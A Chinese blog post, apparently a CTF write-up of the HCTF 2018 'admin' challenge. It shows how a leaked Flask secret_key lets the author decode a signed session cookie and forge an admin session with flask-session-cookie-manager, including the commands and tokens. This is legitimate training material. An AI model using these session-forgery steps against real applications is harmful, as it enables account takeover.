@@ -1,0 +1,746 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.jpg">
+  <link rel="icon" href="/img/avatar.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="K1nm0">
+  <meta name="keywords" content="Security">
+  
+    <meta name="description" content="Writeup for CTF.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HCTF_2018_admin">
+<meta property="og:url" content="https://k1nm0.com/2022/10/23/[HCTF-2018]admin/index.html">
+<meta property="og:site_name" content="洞爷湖">
+<meta property="og:description" content="Writeup for CTF.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://k1nm0.com/2022/10/23/[HCTF-2018]admin/image-20221023125710050.png">
+<meta property="og:image" content="https://k1nm0.com/2022/10/23/[HCTF-2018]admin/image-20221023125736863.png">
+<meta property="og:image" content="https://k1nm0.com/2022/10/23/[HCTF-2018]admin/image-20221023125904442.png">
+<meta property="og:image" content="https://k1nm0.com/2022/10/23/[HCTF-2018]admin/image-20221023130032341.png">
+<meta property="og:image" content="https://k1nm0.com/2022/10/23/[HCTF-2018]admin/image-20221023130435436.png">
+<meta property="article:published_time" content="2022-10-22T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-10-24T01:45:31.376Z">
+<meta property="article:author" content="K1nm0">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="学习">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://k1nm0.com/2022/10/23/[HCTF-2018]admin/image-20221023125710050.png">
+  
+  
+  
+  <title>HCTF_2018_admin - 洞爷湖</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"k1nm0.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":120,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading2.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":"enable","follow_dnt":true,"baidu":"c274d8260883201e6d0377b9f78ad60f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?c274d8260883201e6d0377b9f78ad60f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>洞爷湖</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/wallpaper.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HCTF_2018_admin"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-23 00:00" pubdate>
+          2022年10月23日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          33 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HCTF_2018_admin</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1>[HCTF 2018]admin</h1>
+<h2 id="0x00-过程">0x00 过程</h2>
+<p>发现登录和注册界面，先注册一个用户：</p>
+<p><img src="/2022/10/23/[HCTF-2018]admin/image-20221023125710050.png" srcset="/img/loading2.gif" lazyload alt></p>
+<p>登录后发现cookie里存在session，好像是jwt，但是解码后发现不是。</p>
+<p><img src="/2022/10/23/[HCTF-2018]admin/image-20221023125736863.png" srcset="/img/loading2.gif" lazyload alt></p>
+<p>发现有post和更改密码的功能，post测试后发现无xss，更改密码功能是根据加密的session来提交，无法越权。</p>
+<p>但在查看密码页面中发现了github地址：<a target="_blank" rel="noopener" href="https://github.com/woadsl1234/hctf_flask">https://github.com/woadsl1234/hctf_flask</a></p>
+<p><img src="/2022/10/23/[HCTF-2018]admin/image-20221023125904442.png" srcset="/img/loading2.gif" lazyload alt></p>
+<p>然后发现这道题应该不是逻辑题的思路……通过审查源码发现该站是flask，可以通过伪造session进入admin，翻看文件发现<code>secret_key</code>:ckj123。</p>
+<p><img src="/2022/10/23/[HCTF-2018]admin/image-20221023130032341.png" srcset="/img/loading2.gif" lazyload alt></p>
+<h2 id="0x01-flask-session">0x01 flask session</h2>
+<p><strong>将session存储在客户端cookie中，最重要的就是解决session不能被篡改的问题。</strong></p>
+<blockquote>
+<p>由于 flask 是非常轻量级的 Web框架 ，其 session 存储在客户端中（可以通过HTTP请求头Cookie字段的session获取），且仅对 session 进行了签名，缺少数据防篡改实现，这便很容易存在安全漏洞。</p>
+</blockquote>
+<h3 id="flask-session-分析">flask session 分析</h3>
+<p>flask对session的处理位于flask/sessions.py中，默认情况下flask的session以cookie的形式保存于客户端，利用签名机制来防止数据被篡改。</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">.eJxF<span class="hljs-number">0</span>EFr<span class="hljs-name">g0</span>AUBOC_Ut<span class="hljs-number">45</span>h<span class="hljs-number">3</span>X<span class="hljs-attr">VSyCHwm7</span>Ew<span class="hljs-number">1</span>vZsFF<span class="hljs-number">8</span>l<span class="hljs-number">5</span>Ba<span class="hljs-meta">o67</span>dF<span class="hljs-symbol">NSwiSH_vSaF9</span>jzwDT<span class="hljs-symbol">N3</span>OJyGemxhPQ<span class="hljs-number">2</span>XegWH<span class="hljs-number">7</span>hPWd<span class="hljs-number">3</span>j<span class="hljs-number">7</span>gDVkibIllwxF<span class="hljs-number">6</span>tWc<span class="hljs-number">3</span>lAgLy<span class="hljs-number">05</span>MmVIxa<span class="hljs-number">4</span><span class="hljs-symbol">nJz3</span>Z<span class="hljs-attr">vSenQxIyxCRv1</span>SwjJVKm<span class="hljs-symbol">nLyi1</span>TGZXZeZPsK<span class="hljs-number">5</span>iVUifVZgW<span class="hljs-symbol">Nq8</span>J<span class="hljs-number">7</span>Fr<span class="hljs-number">0</span>ciYitwp-z<span class="hljs-number">6</span>XVrL<span class="hljs-name">M4</span>A<span class="hljs-number">35</span>Pij<span class="hljs-symbol">NdnHQq0</span>JeyTaR<span class="hljs-number">4</span>rlDUQWY<span class="hljs-number">7</span>Fkm<span class="hljs-symbol">NFOmmrFIryS2</span>_WJZtOkGHiuoxuF<span class="hljs-number">0</span>mL<span class="hljs-number">77</span>-vw_YeHR<span class="hljs-number">6</span>RvOmiHXESU<span class="hljs-number">6</span>VoZaEhW<span class="hljs-symbol">nJ2</span>EaT<span class="hljs-number">4</span><span class="hljs-symbol">n6</span>WuoCxZ_<span class="hljs-number">1</span>qiubzYvr<span class="hljs-number">3</span>LGp_yRyk<span class="hljs-number">9</span>b-<span class="hljs-symbol">Nzkf3</span>RLAVI<span class="hljs-number">8</span>TrOAy<span class="hljs-number">1</span>sPr<span class="hljs-symbol">NggYPH4</span>A<span class="hljs-number">7</span>tpryw.Y<span class="hljs-number">1</span>TA<span class="hljs-number">4</span>A.PGk<span class="hljs-number">6</span>Dl<span class="hljs-number">2</span>hS<span class="hljs-meta">o1</span>v<span class="hljs-number">5</span>A<span class="hljs-number">72</span>lIsxPaXJJ<span class="hljs-number">3</span>k<br></code></pre></td></tr></table></figure>
+<ul>
+<li>通过.隔开的3段内容，第一段其实就是base64 encode后的内容，但去掉了填充用的等号，若decode失败，自己需要补上1-3个等号补全。中间内容为时间戳，在flask中时间戳若超过31天则视为无效。最后一段则是安全签名，将sessiondata,时间戳，和flask的secretkey通过sha1运算的结果。</li>
+</ul>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">json</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">zlib</span>-&gt;</span>base64后的源字符串 . 时间戳 . hmac签名信息<br></code></pre></td></tr></table></figure>
+<ul>
+<li>服务端每次收到cookie后，会将cookie中前两段取出和secretkey做sha1运算，若结果与cookie第三段不一致则视为无效。</li>
+<li>从cookie获取session的过程便是验证签名-&gt;验证是否过期-&gt;解码。</li>
+</ul>
+<h3 id="漏洞成因">漏洞成因</h3>
+<p>漏洞的根源是secretkey被获取，应当使用完全随机的secretkey，或在clone某项目后修改为随机的key。</p>
+<p><strong>需要特别注意的是python2与python3下产生的timestamp是不一样的！！</strong></p>
+<h3 id="利用工具：">利用工具：</h3>
+<ul>
+<li>网址：（<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager%EF%BC%89">https://github.com/noraj/flask-session-cookie-manager）</a></li>
+<li>通过上述脚本解密处 session ，我们就可以大概知道 session 中存储着哪些基本信息。然后我们可以通过其他漏洞获取用于签名认证的 secret_key ，进而伪造任意用户身份，扩大攻击效果。</li>
+</ul>
+<h2 id="0x02-利用">0x02 利用</h2>
+<p>下载<code>flask-session-cookie-manager</code>，已知<code>secret</code>为<code>ckj123</code>，当前session为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">.eJxF0EFrg0AUBOC_Ut45h3XVSyCHwm7Ew1vZsFF8l5Bao67dFNSwiSH_vSaF9jzwDTN3OJyGemxhPQ2XegWH7hPWd3j7gDVkibIllwxF6tWc3lAgLy05MmVIxa4nJz3ZvSenQxIyxCRv1SwjJVKmnLyi1TGZXZeZPsK5iVUifVZgWNq8J7Fr0ciYitwp-z6XVrLM4A35PijNdnHQq0JeyTaR4rlDUQWY7FkmNFOmmrFIryS2_WJZtOkGHiuoxuF0mL77-vw_YeHR6RvOmiHXESU6VoZaEhWnJ2EaT4n6WuoCxZ_1qiubzYvr3LGp_yRyk9b-Nzkf3RLAVI8TrOAy1sPrNggYPH4A7tpryw.Y1TA4A.PGk6Dl2hSo1v5A72lIsxPaXJJ3k<br></code></pre></td></tr></table></figure>
+<p>使用工具解密session，然后将session里的test用户替换成admin：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">shell&gt; python flask_session_cookie_manager3.py decode -s ckj123 -c .eJxF0EFrg0AUBOC_Ut45h3XVSyCHwm7Ew1vZsFF8l5Bao67dFNSwiSH_vSaF9jzwDTN3OJyGemxhPQ2XegWH7hPWd3j7gDVkibIllwxF6tWc3lAgLy05MmVIxa4nJz3ZvSenQxIyxCRv1SwjJVKmnLyi1TGZXZeZPsK5iVUifVZgWNq8J7Fr0ciYitwp-z6XVrLM4A35PijNdnHQq0JeyTaR4rlDUQWY7FkmNFOmmrFIryS2_WJZtOkGHiuoxuF0mL77-vw_YeHR6RvOmiHXESU6VoZaEhWnJ2EaT4n6WuoCxZ_1qiubzYvr3LGp_yRyk9b-Nzkf3RLAVI8TrOAy1sPrNggYPH4A7tpryw.Y1TA4A.PGk6Dl2hSo1v5A72lIsxPaXJJ3k<br><br>&#123;<span class="hljs-string">&#x27;_fresh&#x27;</span>: True, <span class="hljs-string">&#x27;_id&#x27;</span>: b<span class="hljs-string">&#x27;8ccca4020722036b6fe67eddfa0f50fd7d170ea7184246a1249e4b9983894a09c7b5dd4a119eef603b149323e5a1a7305a1f887ef0750e48445731b1d1db5c22&#x27;</span>, <span class="hljs-string">&#x27;csrf_token&#x27;</span>: b<span class="hljs-string">&#x27;9ef2d23443d8dd956ad76eb1e80dce7357c23cbb&#x27;</span>, <span class="hljs-string">&#x27;image&#x27;</span>: b<span class="hljs-string">&#x27;fkPC&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;user_id&#x27;</span>: <span class="hljs-string">&#x27;10&#x27;</span>&#125;<br><br>shell&gt; python flask_session_cookie_manager3.py encode -s ckj123 -t <span class="hljs-string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;8ccca4020722036b6fe67eddfa0f50fd7d170ea7184246a1249e4b9983894a09c7b5dd4a119eef603b149323e5a1a7305a1f887ef0750e48445731b1d1db5c22&#x27;, &#x27;csrf_token&#x27;: b&#x27;9ef2d23443d8dd956ad76eb1e80dce7357c23cbb&#x27;, &#x27;image&#x27;: b&#x27;fkPC&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span><br><br>.eJxF0EGLwjAUBOC_sryzhzRtL4KHhWRLDy8lElvyLuLW2jbduFCVaMX_vtWF3fPAN8zcYXsYm1MHy_N4aRaw7fewvMPbJyyhyJSzXDIUeVBTfkOB3DryZGxM1XogLwO5TSCvYxIyxqzs1CQTJXKmvLyi0ymZdV-YIcGpTVUmQ1FhbF05kFh3aGRKVemVe5-sk6wweEO-iaz5mB0MqpJXcm2ieOlR1BFmG1YIzZSpJ6zyK4mPYbYcunwFjwXUp_GwPX8PzfF_wsyj1zecNEOuE8p0qgx1JGpOT8K0gTL1NddFij_rVW_b1Yvr_a5t_iTyZ63Db3Lc-TmA3d73R1jA5dSMr98gYvD4AVqXbBQ.Y1TEoA.cNNCikWfk8OnehmanfDY5GMaznk<br></code></pre></td></tr></table></figure>
+<p>将session替换即可getflag：</p>
+<p><img src="/2022/10/23/[HCTF-2018]admin/image-20221023130435436.png" srcset="/img/loading2.gif" lazyload alt></p>
+<h2 id="0x03-参考">0x03 参考</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44190459/article/details/116774912">flask框架漏洞_JJT_with_hair的博客-CSDN博客_flask漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45615127/article/details/117150993">Flask之session伪造_HackerTenG的博客-CSDN博客_flask session伪造</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">noraj/flask-session-cookie-manager: Flask Session Cookie Decoder/Encoder (github.com)</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AD%A6%E4%B9%A0/" class="category-chain-item">学习</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E5%AD%A6%E4%B9%A0/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E5%AD%A6%E4%B9%A0/CTF/WEB/" class="category-chain-item">WEB</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/WEB/">#WEB</a>
+      
+        <a href="/tags/%E5%AD%A6%E4%B9%A0/">#学习</a>
+      
+        <a href="/tags/CTF/">#CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HCTF_2018_admin</div>
+      <div>https://k1nm0.com/2022/10/23/[HCTF-2018]admin/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>K1nm0</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年10月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="PHP反序列化漏洞总结">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP反序列化漏洞总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/23/%5BMRCTF2020%5DEz_bypass/" title="MRCTF2020_Ez_bypass">
+                        <span class="hidden-mobile">MRCTF2020_Ez_bypass</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <span>K1nm0 © 2019 – 2022 </span> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicRibbon.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
